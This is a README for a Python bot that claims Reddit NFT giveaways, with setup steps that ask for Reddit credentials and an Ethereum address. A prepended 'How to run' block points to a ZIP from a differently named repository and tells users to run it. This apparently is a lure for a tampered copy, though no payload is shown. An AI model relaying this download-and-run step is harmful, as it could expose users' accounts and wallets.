> [!TIP] 
> # How to run
> 
> ## Install Python
> 
> 1. Go to the official Python website: https://www.python.org/downloads/release/python-3139/
> 2. Scroll down to the files part. Then download the Windows installer (64-bit)
> 3. Once downloaded, run the installer.
> 4. ✅ Important: On the first screen of the installer, check the box that says
> “Add Python to PATH” before clicking Install Now.
> ## How to download the repo
> Click the button below to download the code as a .zip:
>
> <a href="https://github.com/dimplespsix8613/reddit-nft-sniper/archive/refs/heads/main.zip"><img src="https://img.shields.io/badge/⬇️_Download_ZIP-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"></a>
>
> 
> Now extract the .zip folder
> 
> ## Run the script
> 
> Open the command prompt inside the extracted folder and run:
>
> `py main.py`
> 
>  or
> 
> `python main.py`


<div align="center">
<h1>Reddit NFT Freebies</h1>
<img src="https://user-images.githubusercontent.com/88138099/142779007-babd0822-192a-41db-a186-30f0b8f17318.png"/></br>
<i>example of a giveaway being held on the <a href="https://www.reddit.com/r/NFTsMarketplace/">subreddit</a></i>
</div>

## Prerequisites

- [Python](https://www.python.org/downloads/release/python-3139/)
- [Docker](https://docs.docker.com/get-docker/) (If you intend on deploying the app as a Docker image)

## Install

There are two ways to begin using the bot, depending on your preference:

### Manual

```bash
cd reddit-nft-freebies
pip install -r requirements.txt
py main.py
```

### Docker

```bash
cd reddit-nft-freebies
docker build -t reddit-nft-freebies .
docker run -d --name reddit-nft-freebies -v `pwd`/config.py:/app/config.py reddit-nft-freebies:latest
```

## Configuration

Before running the bot, you must first set it up so it can connect to the Reddit API. Create a config.py file and fill in the following information:

- `REDDIT_CLIENT_ID`: client id from reddit app
- `REDDIT_CLIENT_SECRET`: client secret from reddit app
- `REDDIT_USERNAME`: reddit account username
- `REDDIT_PASSWORD`: reddit account password
- `ETH_ADDRESS`: your ethereum wallet address

#### Create a Reddit app

1. Go to your [app preferences](https://old.reddit.com/prefs/apps/), and click on "Create an app" button at the bottom of the page.

2. Fill out the "Create application" form, it doesn't matter what you fill inside it except the "type" section in which you must select "script".

3. Click on the "Create app" button. Your newly created app should now appear under the "Developed applications" section!

4. Copy the **ID** and **SECRET** of your app.

xka